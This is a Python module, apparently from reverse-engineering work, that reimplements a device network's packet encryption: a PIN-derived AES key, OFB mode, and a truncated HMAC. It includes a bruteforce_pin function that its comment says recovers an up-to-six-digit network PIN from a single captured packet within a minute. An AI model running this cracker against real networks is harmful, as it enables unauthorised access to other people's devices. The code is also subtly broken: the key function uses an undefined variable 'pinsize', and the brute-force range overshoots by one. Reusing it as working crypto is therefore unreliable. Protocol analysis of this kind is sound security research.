import hmac
import hashlib
import struct
import random
from Cryptodome.Cipher import AES

def network_key_from_pin(pin, intpinsize=4):
    # Derives the long term network key(128 bits) from the PIN,
    # padding the pin to intpinsize digits if provided as an integer
    if isinstance(pin, int):
        pin = str(pin).zfill(pinsize)
    pin2 = pin.encode('ascii') + b'\x00MCP'
    return generate_key(pin2)

def generate_key(binary):
    h = hashlib.sha256()
    h.update(binary)
    dig = bytearray(h.digest())
    dig.reverse()
    return bytes(dig)[:16]

def make_packet(key,seq,data):
    magic = b'\x80'
    eof = b'\xff'
    dlen = len(data)
    #Compute 128 bit IV based on the sequence number/nonce
    iv = struct.pack("<Ixc10x",seq,magic)
    #Initialize AES in OFB mode with the IV we just computed
    enc = AES.new(key, AES.MODE_OFB, iv)
    payload = bytearray(enc.encrypt(data))
    #Now pad, combine with header and compute HMAC
    prehmac = struct.pack("<8xIc"+str(dlen)+"s",seq,magic,bytes(payload))
    hm = bytearray(hmac.new(key, msg=prehmac, digestmod=hashlib.sha256).digest())
    #Reverse the order of the bytes and truncate
    hm.reverse()
    hm = bytes(hm)[:8]
    final = struct.pack("<Ic"+str(dlen)+"s8sc",seq,magic,bytes(payload),hm,eof)
    return final

def decrypt_packet(key, data):
    if(len(data)<14):
        return None
    od = {}
    dlen = len(data)-14
    (seq, magic, epayload, hmac_packet, eof) = struct.unpack("<Ic"+str(dlen)+"s8sc", data)
    #Pad, combine with header and compute HMAC
    prehmac = struct.pack("<8xIc"+str(len(epayload))+"s",seq,magic,epayload)
    hm = bytearray(hmac.new(key, msg=prehmac, digestmod=hashlib.sha256).digest())
    #Reverse the order of the bytes and truncate
    hm.reverse()
    hmac_computed = bytes(hm)[:8]
    #Compute the IV and initialize AES context
    iv = struct.pack("<Ixc10x",seq,magic)
    enc = AES.new(key, AES.MODE_OFB, iv)
    #Decrypt the payload
    decpayload = enc.decrypt(bytes(epayload))
    od['seq']=seq
    od['magic']=magic
    od['encpayload']=epayload
    od['decpayload']=decpayload
    od['hmac_computed']=hmac_computed
    od['hmac_packet']=hmac_packet
    od['eof']=eof
    return od

def bruteforce_pin(data):
    # Cracks the up to 6 digit pin within a minute,
    # given the contents of a packet.
    for pinlen in range(1,7):
        for x in range(0,(10**pinlen)+1):
            ki = network_key_from_pin(x, pinlen)
            trial = decrypt_packet(ki, data)
            if(trial['hmac_computed'] == trial['hmac_packet']):
                return x
    return None

def random_seq():
    #Sequence number must just be different, not necessarily sequential
    return random.randint(1,16777215)
